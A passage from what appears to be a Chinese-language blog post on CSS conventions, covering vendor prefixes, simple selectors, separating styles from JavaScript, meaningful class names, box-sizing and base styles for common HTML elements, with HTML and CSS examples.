class="attribute">padding-bottom</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* @deprecated */</span></span><br><span class="line"><span class="selector-class">.navigation-link</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#1200ff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-结构一致的规则集"><a href="#3-2-结构一致的规则集" class="headerlink" title="3.2 结构一致的规则集"></a>3.2 结构一致的规则集</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// Recommended</span><br><span class="line">selector &#123;</span><br><span class="line">  property1: value;</span><br><span class="line">  property2: value;</span><br><span class="line">  property3: value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tips</p>
<p>现在的前端项目一般都已工程化，无需手动挡压缩一行行的写，没不要，而且不便于阅读及定位查找，注释也不方便写。</p>
</blockquote>
<h4 id="用浏览器引擎前缀组织属性"><a href="#用浏览器引擎前缀组织属性" class="headerlink" title="用浏览器引擎前缀组织属性"></a>用浏览器引擎前缀组织属性</h4><p>常见的前缀有以下几个：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用 Blink 或 WebKit 渲染引擎的浏览器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">-webkit- <span class="comment">/* Chrome、Safari */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Gecko 渲染引擎的浏览器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">-moz- <span class="comment">/* firefox */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用 Trident 渲染引擎的浏览器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">-ms- <span class="comment">/* Internet Explorer */</span></span><br></pre></td></tr></table></figure>

<p>示例</p>
<p>transform-origin 就是一个这样的属性，别忘了写原配<code>transform-origin</code>，并写在最后。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">-ms-<span class="attribute">transform-origin</span>: @origin;</span><br><span class="line">-moz-<span class="attribute">transform-origin</span>: @origin;</span><br><span class="line">-webkit-<span class="attribute">transform-origin</span>: @origin;</span><br><span class="line"><span class="attribute">transform-origin</span>: @origin;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tips</p>
<p>带前缀的 CSS 属性增加了维护成本，因为它们使得样式表急剧膨胀。为了弥补这一弱点，很多浏览器厂商转而使用选择性加入（opt-in）的功能，以便让开发人员实验最新的 CSS 属性。如果用户仍使用老式浏览器访问你的网站，你需要支持它们，然而，你也许还想继续支持带前缀的 CSS 属性。</p>
</blockquote>
<h3 id="3-3-保持选择器的简单"><a href="#3-3-保持选择器的简单" class="headerlink" title="3.3 保持选择器的简单"></a>3.3 保持选择器的简单</h3><p>选择器能够做到非常精确，并不意味着它们就应该很精确。不要高度依赖页面的 HTML 结构。</p>
<p>示例</p>
<p>用于选择某一特定元素的 CSS 选择器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- bad 高度依赖页面的 HTML 结构 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Keep Selectors Simple<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">div</span> &gt; <span class="selector-tag">nav</span> &gt; <span class="selector-tag">ul</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#1200ff</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./policies.html&quot;</span>&gt;</span>Policies<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- good --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Keep Selectors Simple<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">a</span><span class="selector-class">.nav-link</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#1200ff</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./policies.html&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span>&gt;</span>Policies<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*better */</span></span><br><span class="line"><span class="selector-class">.nav-link</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#1200ff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="高性能选择器"><a href="#高性能选择器" class="headerlink" title="高性能选择器"></a>高性能选择器</h4><p>简单的选择器复用程度高，易于理解，而并不是因为它们更高效，虽然这一点显而易见。</p>
<ol>
<li><p><strong>从右向左匹配选择器</strong></p>
<p>浏览器从右向左匹配选择器，因此它能够忽略前面不匹配的元素。</p>
</li>
<li><p><strong>关键选择器</strong></p>
<p>示例</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> * &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正如前面讲过的，浏览器从右向左匹配元素，因此它能够及时排除与选择器不匹配的元素。选择器最右边的部分叫作关键选择器。该示例是以通用选择器 * 作为关键选择器的。</p>
<p>单独使用通用选择器为所有元素（* {} ）应用样式，浏览器可以很快完成渲染工作，因为它只需要匹配页面的每个元素。然而，当通用选择器与另一个选择器和结合符（祖先选择器）配合使用时，浏览器匹配合适的元素所做的工作要更多。只使用通用选择器，不要将其与结合符和其他选择器配合使用可以解决该题。</p>
</li>
</ol>
<h3 id="3-4-分离-CSS-和-JavaScript"><a href="#3-4-分离-CSS-和-JavaScript" class="headerlink" title="3.4 分离 CSS 和 JavaScript"></a>3.4 分离 CSS 和 JavaScript</h3><p>为了区分 CSS 和 JavaScript 的职能，JavaScript 中用来选择元素的类和 ID，不应该再用来为元素添加样式。类似地，用 JavaScript 修改元素样式时，应该通过增加和删除类来实现。</p>
<h4 id="3-4-1-在-JavaScript-中使用带前缀的类和-ID"><a href="#3-4-1-在-JavaScript-中使用带前缀的类和-ID" class="headerlink" title="3.4.1 在 JavaScript 中使用带前缀的类和 ID"></a>3.4.1 在 JavaScript 中使用带前缀的类和 ID</h4><p>比较简单的修改方法是，在只用于 JavaScript 的类和 ID 前添加<code>js-</code>。例如，如果我们要在 JavaScript 中选择与政策相关的一组选项卡，那么可以用 js-tab-group-policies 作为 ID。只用添加了 js- 前缀的类和 ID 作为 JavaScript 选择器，就可以消除 JavaScript 和 CSS 之间的依赖关系。</p>
<h4 id="3-4-2-用类修改元素样式"><a href="#3-4-2-用类修改元素样式" class="headerlink" title="3.4.2 用类修改元素样式"></a>3.4.2 用类修改元素样式</h4><p>JavaScript 修改样式通过 style 属性这种情况，不仅要在 CSS 文件中查找现有样式，还要在 JavaScript 文件中查找，徒增压力。</p>
<p>因此，若要修改 HTML 元素样式，可通过 JavaScrpit 为该元素增加或删除类。这样不仅可以应用合适的样式，该元素的 CSS 样式集也能跟其余的网站 CSS 合理地组织在一起。</p>
<h3 id="3-5-使用类"><a href="#3-5-使用类" class="headerlink" title="3.5 使用类"></a>3.5 使用类</h3><p>类可根据需要复用多次，特指度低，方便覆盖，而 ID 相反，无法轻易覆盖，并且同一个网页中每个 ID 最多只能用一次。因此，对于持续变化的网站，编写 CSS 时，用类为元素增加样式更佳。</p>
<h3 id="3-6-类名要有意义"><a href="#3-6-类名要有意义" class="headerlink" title="3.6 类名要有意义"></a>3.6 类名要有意义</h3><p>因为它能表达清楚意思，看到它很容易理解给什么元素增加样式。它还具有一定的概括性。</p>
<h4 id="避免使用过于模块化的类"><a href="#避免使用过于模块化的类" class="headerlink" title="避免使用过于模块化的类"></a>避免使用过于模块化的类</h4><p>有意义的类名，描述的是应用样式的元素，而不是为元素应用的样式。</p>
<p>示例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 过于模块化的类 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;font-bold uppercase blue-text margin-bottom-large no-padding&quot;</span>&gt;</span>Too Many CSS Classes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 并不比行类样式更好 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;font-weight: bold; text-transform: uppercase; color: #1200FF;</span></span></span><br><span class="line"><span class="string"><span class="tag"> margin-bottom: 20px; padding: 0&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  Too Many CSS Classes</span><br><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 不过于模块化 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.section-title</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#1200ff</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-transform</span>: uppercase;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;section-title&quot;</span>&gt;</span>Too Many CSS Classes<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-7-创建更好的盒子"><a href="#3-7-创建更好的盒子" class="headerlink" title="3.7 创建更好的盒子"></a>3.7 创建更好的盒子</h3><p>示例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Determining Dimensions with the Box Model<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.example-element</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#ff0000</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#000000</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="language-css">      &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;example-element&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据给元素的 box-sizing 属性赋的值，盒子尺寸的计算方式有两种。在下面两种情况中，外边距都将影响盒子周边的空间，但是计算盒子的尺寸时，不需要考虑外边距。</p>
<ol>
<li><p><strong>box-sizing: content-box;</strong></p>
<p>据上面示例，盒子的尺寸为 180px 180px，因为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">150px 高度 + 10px padding-top + 10px padding-bottom + 5px border-top + 5px border-bottom = 180px 计算后得到的高度</span><br><span class="line">150px 宽度 + 10px padding-left + 10px padding-right + 5px border-left + 5px border-right = 180px 计算后得到的宽度</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>box-sizing: border-box;</strong></p>
<p>据上面示例，盒子的尺寸为 150px 150px，因为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">150px 计算后得到的高度 - 10px padding-top - 10px padding-bottom - 5px border-top - 5px border-bottom = 120px</span><br><span class="line">剔除内边距和边框，盒子的隐性高度 150px 计算后得到的宽度 - 10px padding-left - 10px padding-right - 5px border-left -</span><br><span class="line">5px border-right = 120px 剔除内边距和边框，盒子的隐性宽度</span><br></pre></td></tr></table></figure></li>
</ol>
<p>content-box 和 border-box 两者没有优劣之分，但是很多人发现 border-box 更直观，因为它描述的是包括边框在内的元素的高度和宽度，而不只是内容区域的尺寸。为了保持一致性，通常选用其中一种并坚持使用。</p>
<p>具体设置方法是，用通用选择器进行设置，指定盒子的类型：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">*,</span><br><span class="line">*<span class="selector-pseudo">:after</span>,</span><br><span class="line">*<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-给样式分类"><a href="#4-给样式分类" class="headerlink" title="4 给样式分类"></a>4 给样式分类</h2><p>代码复用是优秀架构的一项基本原则。按照样式的功能对其进行分类和使用，代码的复用方式就会变得更加明显。</p>
<h3 id="4-1-通用样式"><a href="#4-1-通用样式" class="headerlink" title="4.1 通用样式"></a>4.1 通用样式</h3><p>浏览器自带的默认样式表叫作<strong>浏览器默认样式</strong>，它可为 HTML 元素应用默认的样式。因为不同厂商开发的浏览器不同，所以其默认样式表的某些属性和属性值可能有所差异。</p>
<p><strong>通用样式</strong>是指为各种元素的属性设置默认值的样式，否则不同的浏览器将为其应用不同的</p>
<p>样式。</p>
<p>示例：规范了<code>&lt;hr&gt;</code>元素在不同浏览器中的样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. 增加在Firefox浏览器中应用的盒子尺寸类型。</span></span><br><span class="line"><span class="comment"> * 2. 在Edge和IE浏览器中，显示溢出部分。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">hr &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>; <span class="comment">/* 1 */</span></span><br><span class="line">  <span class="attribute">overflow</span>: visible; <span class="comment">/* 2 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tips</p>
<p>开源通用样式表中的很多样式，它们的最大用途体现在解决传统浏览器的兼容问题方面。最通用的样式表是 Nicolas Gallagher 和 Jonathan Neal 开发的 normalize.css</p>
</blockquote>
<h3 id="4-2-基础样式"><a href="#4-2-基础样式" class="headerlink" title="4.2 基础样式"></a>4.2 基础样式</h3><p><strong>基础样式</strong>旨在为设置更加细致的样式提供基础。遵循的基本原则是：为元素应用基础样式之外的其他样式</p>
<p>时，不需要重写大量基础样式就能实现设计目标。</p>
<h4 id="4-2-1-定义基础样式"><a href="#4-2-1-定义基础样式" class="headerlink" title="4.2.1 定义基础样式"></a>4.2.1 定义基础样式</h4><p>基础样式应该只为最笼统的使用场景设置属性和属性值。通常我们为元素设置以下基础属性：</p>
<ul>
<li>color</li>
<li>font-family</li>
<li>font-size</li>
<li>font-weight</li>
<li>letter-spacing</li>
<li>line-height</li>
<li>margin</li>
<li>padding</li>
</ul>
<p>如果你搭建的是设计非常复杂的应用类网站，那么这些样式只能满足初级需求。对可复用的组件，也许需要更复杂的样式。</p>
<p>你在编写基础样式时，需考虑上面列出的这些属性，但并不是任何时候都要全部设置，因为它们都继承自祖先元素（除了 margin 和 padding）。如果 margin 和 padding 应该使用继承来的属性值，则用 inherit 作为属性值。对于某种特定类型的元素，应该纳入基础样式的其他属性或伪类。</p>
<blockquote>
<p>tips</p>
<p>利用继承</p>
<p>对于 color、font-family、font-size、font-weight、letter-spacing 和 line-height 属性，子元素继承自父元素，因此子元素的属性值不总是需要设置。关于这些 CSS 属性值是否继承的完整列表，请见 <a href="https://www.w3.org/TR/CSS21/propidx.html">https://www.w3.org/TR/CSS21/propidx.html</a>。需要指定样式的完整 HTML 元素列表，请见 <a href="https://www.w3.org/TR/html-markup/elements.html">https://www.w3.org/TR/html-markup/elements.html</a>。</p>
</blockquote>
<h4 id="4-2-2-文档元数据元素"><a href="#4-2-2-文档元数据元素" class="headerlink" title="4.2.2 文档元数据元素"></a>4.2.2 文档元数据元素</h4><p>记录元数据的标签包括 <code>&lt;head&gt;、&lt;title&gt;、&lt;base&gt;、&lt;link&gt; 和 &lt;meta&gt;</code>。因为它们不可见，故不能为其添加样式。</p>
<h4 id="4-2-3-区块元素"><a href="#4-2-3-区块元素" class="headerlink" title="4.2.3 区块元素"></a>4.2.3 区块元素</h4><p>区块元素包括 <code>&lt;address&gt;、&lt;article&gt;、&lt;aside&gt;、&lt;body&gt;、&lt;footer&gt;、&lt;header&gt;、&lt;nav&gt; 和 &lt;section&gt;</code>。该类元素通常包含其他元素，它们组成了 HTML 文档的各种区域。</p>
<p>考虑一下给区块元素设置以下属性：</p>
<ul>
<li>color</li>
<li>font-family</li>
<li>font-size</li>
<li>font-weight</li>
<li>letter-spacing</li>
<li>line-height</li>
<li>padding</li>
</ul>
<p><code>&lt;body&gt;</code> 元素也许还需要设置背景色 background 属性。</p>
<p>示例：为区块元素设置基础样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#333333</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: Helvetica, Arial, sans-serif;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.3</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5%</span> <span class="number">20%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">article</span>,</span><br><span class="line"><span class="selector-tag">footer</span>,</span><br><span class="line"><span class="selector-tag">header</span>,</span><br><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">article</span>,</span><br><span class="line"><span class="selector-tag">nav</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">footer</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-4-标题和文本元素"><a href="#4-2-4-标题和文本元素" class="headerlink" title="4.2.4 标题和文本元素"></a>4.2.4 标题和文本元素</h4><p>标题元素包括 <code>&lt;h1&gt;—&lt;h6&gt;</code> 六级标题，用于定义 HTML 文档每个区域的标题。文本元素包括 <code>&lt;fifigure&gt;、&lt;fifigcaption&gt;、&lt;p&gt; 和 &lt;pre&gt;</code>，用来展示块状文本。</p>
<p>为标题和文本元素定义基础样式时，需考虑以下属性：</p>
<ul>
<li>font-family</li>
<li>font-size</li>
<li>font-weight</li>
<li>letter-spacing</li>
<li>line-height</li>
<li>margin-bottom</li>
<li>margin-top</li>
</ul>
<p>示例：标题和文本元素的基础样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,</span><br><span class="line"><span class="selector-tag">h2</span>,</span><br><span class="line"><span class="selector-tag">h3</span>,</span><br><span class="line"><span class="selector-tag">h4</span>,</span><br><span class="line"><span class="selector-tag">h5</span>,</span><br><span class="line"><span class="selector-tag">h6</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: Georgia, Times, serif;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">100</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.1</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0.5em</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h2</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">24px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h3</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">21px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h4</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h5</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h6</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span>,</span><br><span class="line">pre &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-5-锚点标签元素"><a href="#4-2-5-锚点标签元素" class="headerlink" title="4.2.5 锚点标签元素"></a>4.2.5 锚点标签元素</h4><p>锚点标签为其他 HTML 文档或同一 HTML 文档的其他区域提供链接。它们常用 :link、:visited、:focus、:hover 和 :active 伪类展示状态，因此为其定义基础样式时，不要忘记这些伪类，以及顺序影响的样式覆盖。</p>
<p>为锚点标签及其伪类定义基础样式时，应该考虑的常用属性包括：</p>
<ul>
<li>background-color</li>
<li>border</li>
<li>color</li>
<li>font-weight</li>
<li>text-decoration</li>
</ul>
<blockquote>
<p>tips</p>
<p>若从超链接元素的 :foucs 伪类中删除 outline 属性，且不在页面上以可见的形式加以提示，对于只用键盘或使用其他交互方式有别于鼠标的用户而言，严重影响网站的可用性。</p>
</blockquote>
<p>示例：超链接的基础样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:focus</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: inherit;</span><br><span class="line">  <span class="attribute">text-decoration</span>: underline;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#ffff00</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-6-文本语义元素"><a href="#4-2-6-文本语义元素" class="headerlink" title="4.2.6 文本语义元素"></a>4.2.6 文本语义元素</h4><p>文本语义元素是指为文本提供更多含义或结构的元素。这些元素通常为行内元素，其中包括 <code>&lt;abbr&gt;、&lt;b&gt;、&lt;cite&gt;、&lt;code&gt;、&lt;data&gt;、&lt;dfn&gt;、&lt;em&gt;、&lt;i&gt;、&lt;kbd&gt;、&lt;s&gt;、&lt;strong&gt;、&lt;sub&gt;、&lt;sup&gt;、&lt;time&gt; 和 &lt;u&gt;</code> 等标签。</p>
<p>该类元素用来修改文本的样式，为其定义基础样式时，考虑以下属性：</p>
<ul>
<li>color</li>
<li>font-family</li>
<li>font-size</li>
<li>font-weight</li>
</ul>
<p>示例：给<code>&lt;code&gt;</code>标签定义样式</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">code</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#00ff00</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: monospace;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">500</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-2-7-列表"><a href="#4-2-7-列表" class="headerlink" title="4.2.7 列表"></a>4.2.7 列表</h4><p>列表元素包括 <code>&lt;ol&gt;（有序列表）、&lt;ul&gt;（无序列表）和 &lt;dl&gt;（定义列表）元素</code>。列表的一些应用场景包括水平导航、商品列表、社交媒体用户的个人主页等。</p>
<p>为有序和无序列表元素定义基础样式时，应该考虑以下属性：</p>
<ul>
<li>font-family</li>
<li>font-size</li>
<li>list-style-type 或 list-style-image</li>
<li>list-style-position</li>
